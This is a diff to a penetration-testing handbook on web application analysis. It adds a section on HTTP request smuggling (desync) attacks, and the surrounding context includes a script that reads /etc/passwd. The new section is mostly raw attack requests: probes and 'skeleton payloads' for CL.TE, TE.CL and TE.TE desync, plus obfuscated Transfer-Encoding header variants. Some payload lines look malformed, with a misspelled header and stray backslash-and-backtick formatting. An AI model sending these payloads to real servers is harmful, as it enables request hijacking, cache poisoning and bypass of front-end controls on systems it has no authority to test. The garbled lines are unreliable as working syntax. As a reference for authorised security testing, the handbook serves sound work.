@@ -30,6 +30,7 @@
 - [Hakrawler](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Hakrawler)
 - [Host Header Regex Bypass](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Host-Header-Regex-Bypass)
 - [HTML Injection](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#HTML-Injection)
+- [HTTP Request Smuggling / HTTP Desync Attack](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#HTTP-Request-Smuggling-HTTP-Desync-Attack)
 - [httprobe](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#httprobe)
 - [httpx](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#httpx)
 - [Interactsh](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Interactsh)
@@ -673,6 +674,89 @@ document.write(this.responseText)
 x.open("GET","file:///etc/passwd");
 x.send();
 </script>
+```
+
+## HTTP Request Smuggling / HTTP Desync Attack
+
+### Quick Wins
+
+```c
+Content-Length: 0
+Connection: Content-Lentgh
+```
+
+### Content-Length / Transfer-Encoding (CL.TE)
+
+#### Searching for Vulnerability
+
+```c
+POST / HTTP/1.1
+Host: <RHOST>
+Transfer-Encoding: chunked
+Connection: keep-alive
+Content-Length: 4
+
+1
+A
+0
+```
+
+#### Skeleton Payload
+
+```c
+POST / HTTP/1.1
+Host: <RHOST>
+Content-Length: 30
+Connection: keep-alive
+Transfer-Encoding: chunked
+\ `0`\
+GET /404 HTTP/1.1
+Foo: Bar
+```
+
+### Transfer-Encoding / Content-Length (TE.CL)
+
+#### Searching for Vulnerability
+
+```c
+POST / HTTP/1.1
+Host: <RHOST>
+Transfer-Encoding: chunked
+Connection: keep-alive
+Content-Length: 6
+
+0
+X
+```
+
+#### Skeleton Payload
+
+```c
+POST / HTTP/1.1
+Host: <RHOST>
+Content-Length: 4
+Connection: keep-alive
+Transfer-Encoding: chunked
+\ `7b`\ `GET /404 HTTP/1.1`\ `Host: <RHOST>`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 30`\
+x=
+0
+\
+```
+
+### Transfer-Encoding / Transfer-Encoding (TE.TE)
+
+```c
+Transfer-Encoding: xchunked
+\ `Transfer-Encoding : chunked`\
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+\ `Transfer-Encoding: chunked`\ `Transfer-encoding: x`\
+Transfer-Encoding:[tab]chunked
+\ `[space]Transfer-Encoding: chunked`\
+X: X[\n]Transfer-Encoding: chunked
+``
+Transfer-Encoding
+: chunked
 ```
 
 ## httprobe
